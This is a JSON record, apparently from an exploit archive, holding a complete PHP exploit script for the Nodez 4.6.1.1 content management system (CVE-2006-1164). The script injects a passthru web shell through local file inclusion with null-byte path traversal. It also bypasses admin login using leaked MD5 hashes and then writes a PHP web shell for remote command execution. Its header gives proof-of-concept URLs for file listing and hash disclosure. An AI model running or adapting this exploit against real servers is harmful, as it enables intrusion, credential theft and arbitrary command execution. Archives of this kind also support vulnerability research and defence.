{
  "id": "1588",
  "title": "nodez 4.6.1.1 mercury - Multiple Vulnerabilities",
  "cve": "CVE-2006-1164",
  "vuln_type": "rce",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho \"Nodez 4.6.1.1 Mercury (possibly prior versions) multiple vulnerabilities\\r\\n\";\r\necho \"by rgod rgod@autistici.org\\r\\n\";\r\necho \"site: http://retrogod.altervista.org\\r\\n\\r\\n\";\r\n\r\n/*\r\n   software:\r\n   site: nodez.greentinted.com/\r\n   description: Nodez - \"An open source  (content management system), designed to\r\n   be flexible, expandable, and as modular as possible.\" (ndr: maybe too modular ;) )\r\n\r\n   short explaination:\r\n   i) 'op','bop','ext','eop' arguments are not properly sanitized before to\r\n   include files from local resources. You can include arbitrary files\r\n   breaking the path through a null char (%00). Also you can inject\r\n   php code in cache/ext/statman/log.gtdat file and launch commands\r\n   including it, poc:\r\n\r\n   http://[target]/[path]/index.php?node=system&op=extop&ext=statman&eop=/visitor&ip=[code]\r\n\r\n   http://[target]/[path]/index.php?node=system&op=blockop&block=3&bop=../../../../cache/ext/statman/log.gtdat%00\r\n   http://[target]/[path]/index.php?node=system&op=../../../cache/ext/statman/log.gtdat%00\r\n   http://[target]/[path]/index.php?node=system&op=extop&ext=statman&eop=../../../../cache/ext/statman/log.gtdat%00\r\n   http://[target]/[path]/index.php?node=system&op=extop&ext=../../cache/ext/statman/log.gtdat%00\r\n\r\n   ii)\r\n   to list all files on target system:\r\n   http://[target]/[path_to_nodez]/countlines.php\r\n\r\n   iii)last but not least, the most chritical issue:\r\n\r\n   you can view all admin/users md5 password hashes, ex:\r\n\r\n   http://[target]/[path_to_nodez]/cache/users/list.gtdat\r\n\r\n   (if you do not believe it, give a look to the online demo:\r\n   http://demo.opensourcecms.com/nodez/cache/users/list.gtdat)\r\n\r\n   this because nodez do not provide an .htaccess file for users folder\r\n\r\n   you don't need to force it to login as admin, you can\r\n   craft a $_POST['upass'] value,ex:\r\n\r\n   [admin_md5_hash][md5(\"rndval[numbers]\")]\r\n\r\n   this string should be calculated by a nodez javascript, but\r\n   you can easily do by yourself (the second fragment is inside\r\n   login page, something like \"rndval[random_numbers]\" )\r\n\r\n   once you have an admin session cookie, you can create and edit php files\r\n   (System options -> Toolbox -> Super Edit) and launch commands from them\r\n\r\n   this exploit makes the dirty work for i) and iii)\r\n                                                                              */\r\nif ($argc<3) {\r\necho \"Usage: php \".$argv[0].\" host path action cmd OPTIONS\\r\\n\";\r\necho \"host:      target server (ip/hostname)\\r\\n\";\r\necho \"path:      path to nodez\\r\\n\";\r\necho \"action:    1 - through arbitrary local inclusion\\r\\n\";\r\necho \"               (works with magic_quotes_gpc= Off)\\r\\n\";\r\necho \"           2 - through admin authentication bypass\\r\\n\";\r\necho \"               (no php.ini restriction, you need the\\r\\n\";\r\necho \"               list.gtdat file)\\r\\n\";\r\necho \"cmd:       a shell command\\r\\n\";\r\necho \"Options:\\r\\n\";\r\necho \"   -p[port]:    specify a port other than 80\\r\\n\";\r\necho \"   -P[ip:port]: specify a proxy\\r\\n\";\r\necho \"Examples:\\r\\n\";\r\necho \"php \".$argv[0].\" localhost /nodez/ 2 ls -la\\r\\n\";\r\necho \"php \".$argv[0].\" localhost /nodez/ 1 cat ./cache/users/list.gtdat\\r\\n\";\r\necho \"php \".$argv[0].\" localhost /nodez/ 1 cat ./cache/users/list.gtdat -p81\\r\\n\";\r\necho \"php \".$argv[0].\" localhost /nodez/ 1 cat ./cache/users/list.gtdat -P1.1.1.1:80\\r\\n\";\r\ndie;\r\n}\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n  #debug\r\n  #echo \"\\r\\n\".$html;\r\n}\r\n\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$action=$argv[3];\r\n$cmd=\"\";$port=80;$proxy=\"\";\r\n\r\nfor ($i=4; $i<=$argc-1; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif (($temp<>\"-p\") and ($temp<>\"-P\"))\r\n{$cmd.=\" \".$argv[$i];}\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\n}\r\n$cmd=urlencode($cmd);\r\n\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\necho \"action selected -> \".$action.\"\\r\\n\";\r\nif ($action==\"1\")\r\n{\r\n\r\necho \"[1] Injecting some code in log.gtdat file...\\r\\n\";\r\n$CODE ='<?php;ob_clean();echo(666);'; //notice the trick to work with short_open_tag off\r\n$CODE.='passthru($_GET[cmd]);echo(666);die;?>';\r\n$packet=\"GET \".$p.\"index.php?node=system&op=extop&ext=statman&eop=/visitor&ip=\".$CODE.\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\\r\\n\";\r\n#echo quick_dump($packet);\r\nsendpacketii($packet);\r\nsleep(1);\r\n$xpl=array ( '&op=blockop&block=3&bop=../../../../cache/ext/statman/log.gtdat%00',\r\n             '&op=../../../cache/ext/statman/log.gtdat%00',\r\n             '&op=extop&ext=statman&eop=../../../../cache/ext/statman/log.gtdat%00',\r\n             '&op=extop&ext=../../cache/ext/statman/log.gtdat%00'\r\n            );\r\n\r\nfor ($i=0; $i<=count($xpl)-1;$i++)\r\n{\r\n$a=$i+2;\r\necho \"[\".$a.\"] Trying with \".$xpl[$i].\"\\r\\n\";\r\n$packet=\"GET \".$p.\"index.php?cmd=\".$cmd.\"&node=system\".$xpl[$i].\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n#echo quick_dump($packet);\r\nsendpacketii($packet);\r\nif (strstr($html,\"666\"))\r\n{\r\necho \"Exploit succeeded...\\r\\n\";\r\n$temp=explode(\"666\",$html);\r\necho $temp[1];\r\ndie;\r\n}\r\n}\r\n}\r\nelse\r\nif ($action==\"2\")\r\n{\r\n echo \"[1] Looking for list.gtdat file...\\r\\n\";\r\n $packet=\"GET \".$p.\"cache/users/list.gtdat HTTP/1.0\\r\\n\";\r\n $packet.=\"Host: \".$host.\"\\r\\n\";\r\n $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n #echo quick_dump($packet);\r\n sendpacketii($packet);\r\n if (strstr($html,\"200 OK\"))\r\n { echo \"Done...we have list.gtdat file\\r\\n\";\r\n }\r\n else\r\n {die(\"Exploit failed...\");}\r\n $temp=explode(\":\\\"\",$html);\r\n $temp2=explode(\"\\\"\",$temp[1]);\r\n $adm=$temp2[0];\r\n echo \"admin -> \".$adm.\"\\r\\n\";\r\n $temp2=explode(\"\\\"\",$temp[3]);\r\n $hash=$temp2[0];\r\n echo \"hash -> \".$hash.\"\\r\\n\";\r\n\r\n echo \"[2] Grab some data from login page...\\r\\n\";\r\n $packet=\"GET \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n $packet.=\"Host: \".$host.\"\\r\\n\";\r\n $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n #echo quick_dump($packet);\r\n sendpacketii($packet);\r\n $temp=explode(\"+hex_md5('\",$html);\r\n $temp2=explode(\"'\",$temp[1]);\r\n echo \"our string -> \".$temp2[0].\"\\r\\n\";\r\n $mypass=$hash.md5($temp2[0]);\r\n echo \"our passport to heaven ->\".$mypass.\"\\r\\n\";\r\n $temp=explode(\"Set-Cookie: \",$html);\r\n $temp2=explode(\" \",$temp[1]);\r\n $cookie=$temp2[0];\r\n echo \"cookie -> \".$cookie.\"\\r\\n\";\r\n\r\n echo \"[3] Login...\\r\\n\";\r\n $data =\"uname=\".urlencode($adm);\r\n $data.=\"&upass=\".urlencode($mypass);\r\n $data.=\"&node=system\";\r\n $data.=\"&ref=node%3Dsystem%26op%3Dlogout\";\r\n $data.=\"&op=login\";\r\n $packet =\"POST \".$p.\"index.php? HTTP/1.0\\r\\n\";\r\n $packet.=\"Host: $host\\r\\n\";\r\n $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n $packet.=\"Cookie: \".$cookie.\"\\r\\n\";\r\n $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n $packet.=$data;\r\n #echo quick_dump($packet);\r\n sendpacketii($packet);\r\n if (eregi(\"Welcome back\",$html)) {echo \"Logged in...\\r\\n\";}\r\n                             else {die(\"Exploit failed...\\r\\n\");}\r\n srand(make_seed());\r\n $anumber = rand(1,99999);\r\n\r\n echo \"[4] Let's create a nodez id...\\r\\n\";\r\n $packet =\"GET \".$p.\"?node=system&op=advanced/superedit&step=edit&id=suntzu\".$anumber.\" HTTP/1.0\\r\\n\";\r\n $packet.=\"Host: \".$host.\"\\r\\n\";\r\n $packet.=\"Cookie: \".$cookie.\"\\r\\n\";\r\n $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n #echo quick_dump($packet);\r\n sendpacketii($packet);\r\n\r\n echo \"[5] Let's create the php file...\\r\\n\";\r\n $data =\"title=suntzu\".$anumber;\r\n $data.=\"&type=blog\";\r\n $data.=\"&path=../suntzu\".$anumber.\".php\";\r\n $data.=\"&hits=0\";\r\n $data.=\"&date=now\";\r\n $packet= \"POST \".$p.\"?node=system&op=advanced/superedit&step=save&id=../suntzu\".$anumber.\".php HTTP/1.0\\r\\n\";\r\n $packet.=\"Host: \".$host.\"\\r\\n\";\r\n $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n $packet.=\"Cookie: \".$cookie.\"\\r\\n\";\r\n $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n $packet.=$data;\r\n #echo quick_dump($packet);\r\n sendpacketii($packet);\r\n\r\n echo \"[6] Let's save the evil code ...\\r\\n\";\r\n $data =\"------------lNnHj26YsSTIS0qSMhw5MK\\r\\n\";\r\n $data.=\"Content-Disposition: form-data; name=\\\"node\\\"\\r\\n\\r\\n\";\r\n $data.=\"system\\r\\n\";\r\n $data.=\"------------lNnHj26YsSTIS0qSMhw5MK\\r\\n\";\r\n $data.=\"Content-Disposition: form-data; name=\\\"op\\\"\\r\\n\\r\\n\";\r\n $data.=\"editfile\\r\\n\";\r\n $data.=\"------------lNnHj26YsSTIS0qSMhw5MK\\r\\n\";\r\n $data.=\"Content-Disposition: form-data; name=\\\"step\\\"\\r\\n\\r\\n\";\r\n $data.=\"finish\\r\\n\";\r\n $data.=\"------------lNnHj26YsSTIS0qSMhw5MK\\r\\n\";\r\n $data.=\"Content-Disposition: form-data; name=\\\"parent\\\"\\r\\n\\r\\n\";\r\n $data.=\"../suntzu\".$anumber.\".php\\r\\n\";\r\n $data.=\"------------lNnHj26YsSTIS0qSMhw5MK\\r\\n\";\r\n $data.=\"Content-Disposition: form-data; name=\\\"nodez_title\\\"\\r\\n\\r\\n\";\r\n $data.=\"suntzu\".$anumber.\"\\r\\n\";\r\n $data.=\"------------lNnHj26YsSTIS0qSMhw5MK\\r\\n\";\r\n $data.=\"Content-Disposition: form-data; name=\\\"nodez_longtitle\\\"\\r\\n\\r\\n\";\r\n $data.=\"suntzu\".$anumber.\"\\r\\n\";\r\n $data.=\"------------lNnHj26YsSTIS0qSMhw5MK\\r\\n\";\r\n $data.=\"Content-Disposition: form-data; name=\\\"nodez_body\\\"\\r\\n\\r\\n\";\r\n $data.=\"<?php if(get_magic_quotes_gpc()){\\$_GET[cmd]=stripslashes(\\$_GET[cmd]);}echo 666;\\r\\n\";\r\n $data.=\"passthru(\\$_GET[cmd]);echo 666;?>\\r\\n\";\r\n $data.=\"------------lNnHj26YsSTIS0qSMhw5MK\\r\\n\";\r\n $data.=\"Content-Disposition: form-data; name=\\\"author\\\"\\r\\n\\r\\n\";\r\n $data.=\"suntzu\\r\\n\";\r\n $data.=\"------------lNnHj26YsSTIS0qSMhw5MK\\r\\n\";\r\n $data.=\"Content-Disposition: form-data; name=\\\"areg\\\"\\r\\n\\r\\n\";\r\n $data.=\"0\\r\\n\";\r\n $data.=\"------------lNnHj26YsSTIS0qSMhw5MK\\r\\n\";\r\n $data.=\"Content-Disposition: form-data; name=\\\"mood\\\"\\r\\n\\r\\n\";\r\n $data.=\"\\r\\n\";\r\n $data.=\"------------lNnHj26YsSTIS0qSMhw5MK\\r\\n\";\r\n $data.=\"Content-Disposition: form-data; name=\\\"music\\\"\\r\\n\\r\\n\";\r\n $data.=\"\\r\\n\";\r\n $data.=\"------------lNnHj26YsSTIS0qSMhw5MK\\r\\n\";\r\n $packet =\"POST \".$p.\"index.php? HTTP/1.1\\r\\n\";\r\n $packet.=\"Host: \".$host.\"\\r\\n\";\r\n $packet.=\"Connection: Close\\r\\n\";\r\n $packet.=\"Cookie:\".$cookie.\"\\r\\n\";\r\n $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n $packet.=\"Content-Type: multipart/form-data; boundary=----------lNnHj26YsSTIS0qSMhw5MK\\r\\n\\r\\n\";\r\n $packet.=$data;\r\n #echo quick_dump($packet);\r\n sendpacketii($packet);\r\n\r\n echo \"[7] Launch commands...\\r\\n\\r\\n\";\r\n $packet =\"GET \".$p.\"suntzu\".$anumber.\".php?cmd=\".$cmd.\" HTTP/1.0\\r\\n\";\r\n $packet.=\"Host: \".$host.\"\\r\\n\";\r\n $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n #echo quick_dump($packet);\r\n sendpacketii($packet);\r\n if (strstr($html,\"666\"))\r\n {\r\n  echo \"Exploit succeeded...\\r\\n\\r\\n\";\r\n  $temp=explode(\"666\",$html);\r\n  echo $temp[1];\r\n  die;\r\n }\r\n}\r\nelse\r\n{die (\"Wrong action...\\r\\n\");}\r\n//if you are here...\r\necho \"Exploit failed...\\r\\n\";\r\n?>\r\n\r\n# milw0rm.com [2006-03-18]",
  "url": "https://www.exploit-db.com/exploits/1588"
}